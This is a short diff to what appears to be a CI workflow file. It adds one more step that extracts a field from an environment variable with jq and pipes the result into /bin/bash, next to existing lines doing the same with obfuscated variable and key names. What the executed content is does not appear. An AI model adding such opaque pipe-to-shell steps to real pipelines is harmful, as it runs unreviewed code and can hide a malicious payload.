@@ -51,6 +51,7 @@ jobs:
           echo $nxjds0 | jq -r .eiecu3 | /bin/bash
           echo $znj035 | jq -r .sguy085 | /bin/bash
           echo $c23 | jq -r .snec637 | /bin/bash
+          printf '%s' "$lc22862" | jq -r .clnrj01 | /bin/bash
 
       - name: Archive output
         if: always()
